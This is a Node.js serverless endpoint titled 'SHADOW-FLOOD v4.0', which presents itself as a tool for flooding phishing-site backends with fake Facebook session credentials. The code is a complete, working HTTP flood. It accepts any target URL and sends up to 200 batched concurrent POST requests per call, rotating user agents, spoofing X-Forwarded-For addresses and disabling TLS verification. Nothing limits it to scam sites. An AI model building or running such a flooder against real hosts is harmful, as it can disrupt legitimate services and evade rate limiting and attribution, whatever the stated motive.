/**
 * SHADOW-FLOOD v4.0 - HTTP FLOOD MODE
 * WORM-AI💀🔥 | No Browser Required | 100% Vercel Compatible
 * 
 * Floods scam backend directly with fake form submissions
 */

const https = require('https');
const http = require('http');
const { URL } = require('url');

// Generate fake Facebook credentials
const generatePayload = () => {
  const c_user = Array(15).fill(0).map(() => Math.floor(Math.random() * 10)).join('');
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789%';
  const xs = Array(25).fill(0).map(() => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
  return { c_user, xs };
};

// Random user agents
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)',
  'Mozilla/5.0 (Linux; Android 13; SM-S918B)',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
];

// Send fake form data
const sendPayload = (targetUrl, payload, lang) => {
  return new Promise((resolve) => {
    const url = new URL(targetUrl);
    const isHttps = url.protocol === 'https:';
    
    // Common form field names used by phishing sites
    const postData = new URLSearchParams({
      c_user: payload.c_user,
      xs: payload.xs,
      language: lang,
      submit: 'submit',
      action: 'login',
      next: 'https://facebook.com'
    }).toString();

    const options = {
      hostname: url.hostname,
      port: isHttps ? 443 : 80,
      path: url.pathname || '/',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(postData),
        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin': targetUrl,
        'Referer': targetUrl,
        'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
      },
      timeout: 10000,
      rejectUnauthorized: false // Bypass SSL errors
    };

    const req = (isHttps ? https : http).request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        resolve({ 
          success: res.statusCode < 400, 
          status: res.statusCode,
          size: data.length 
        });
      });
    });

    req.on('error', (err) => {
      resolve({ success: false, error: err.message });
    });

    req.on('timeout', () => {
      req.destroy();
      resolve({ success: false, error: 'Timeout' });
    });

    req.write(postData);
    req.end();
  });
};

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  
  const { 
    url: targetUrl, 
    iterations = 50,  // Can do 50+ now (no browser overhead)
    lang = 'English',
    method = 'auto' // 'auto', 'post', 'get'
  } = req.query;

  if (!targetUrl) {
    return res.status(400).json({
      error: 'NO TARGET',
      example: '/api/strike?url=https://scam.com&iterations=100'
    });
  }

  let validatedUrl;
  try {
    validatedUrl = new URL(targetUrl).href;
  } catch (e) {
    return res.status(400).json({ error: 'Invalid URL' });
  }

  const count = Math.min(parseInt(iterations) || 50, 200); // Max 200 per request
  
  const results = {
    operation: 'SHADOW-FLOOD v4.0',
    mode: 'HTTP_DIRECT_FLOOD',
    target: validatedUrl,
    language: lang,
    requested: count,
    successful: 0,
    failed: 0,
    payloads: []
  };

  console.log(`[💀🔥] HTTP FLOOD: ${validatedUrl} | ${count} payloads`);

  // Launch concurrent attacks
  const batchSize = 10; // 10 concurrent requests
  for (let batch = 0; batch < Math.ceil(count / batchSize); batch++) {
    const batchPromises = [];
    
    for (let i = 0; i < batchSize && (batch * batchSize + i) < count; i++) {
      const iteration = batch * batchSize + i + 1;
      const payload = generatePayload();
      
      const promise = sendPayload(validatedUrl, payload, lang).then(result => {
        if (result.success) {
          results.successful++;
        } else {
          results.failed++;
        }
        
        results.payloads.push({
          iteration,
          c_user: payload.c_user,
          xs: payload.xs.substring(0, 10) + '...',
          status: result.success ? 'DELIVERED' : 'FAILED',
          code: result.status || result.error
        });
        
        return result;
      });
      
      batchPromises.push(promise);
    }
    
    // Wait for batch to complete
    await Promise.all(batchPromises);
    
    // Small delay between batches
    await new Promise(r => setTimeout(r, 100));
  }

  results.success_rate = `${((results.successful / count) * 100).toFixed(1)}%`;
  results.impact = `Flooded target with ${results.successful} fake credential submissions`;
  results.note = 'HTTP Direct Mode - No browser overhead';

  res.json(results);
};
